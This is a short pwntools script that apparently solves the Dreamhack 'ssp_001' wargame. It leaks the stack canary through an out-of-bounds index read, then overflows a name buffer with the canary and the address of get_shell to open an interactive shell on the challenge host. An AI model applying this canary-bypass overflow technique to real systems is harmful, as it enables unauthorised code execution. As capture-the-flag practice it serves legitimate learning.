from pwn import *

def slog(n,m): return success(': '.join([n,hex(m)]))

#p = process("./ssp_001")
p = remote("host3.dreamhack.games", 23955)
context.arch = 'i386'

cnry = b''
#[1]Check Canary Value
for i in range(0x83, 0x7f, -1):
	p.sendafter(b"> ", b"P")

	p.recvuntil(b"index :")
	payload = bytes(str(i),'utf-8')
	p.sendline(payload)
	p.recvuntil(' : ')
	cnry +=p.recv(2)

cnry = int(cnry,16)
slog('Canary', cnry)

#[2]Exploit shellcode

p.sendafter(b"> ", b"E")
p.recvuntil(b"Size :")
name_len = eval("0x40+0x04+0x04+0x04+0x04")
payload = str(name_len).encode('utf-8')
print(f"Sending name_len: {name_len}")
p.sendline(payload)

p.recvuntil(b"Name :")

e=ELF('./ssp_001')
get_shell = e.symbols['get_shell']
payload = b'A'*0x40 #name 
payload += p32(cnry) #canary value
payload += b'B'*0x08 #dummy, rbp
payload += p32(get_shell)

print(f"Sending shellcode...")

p.sendline(payload)
p.interactive()

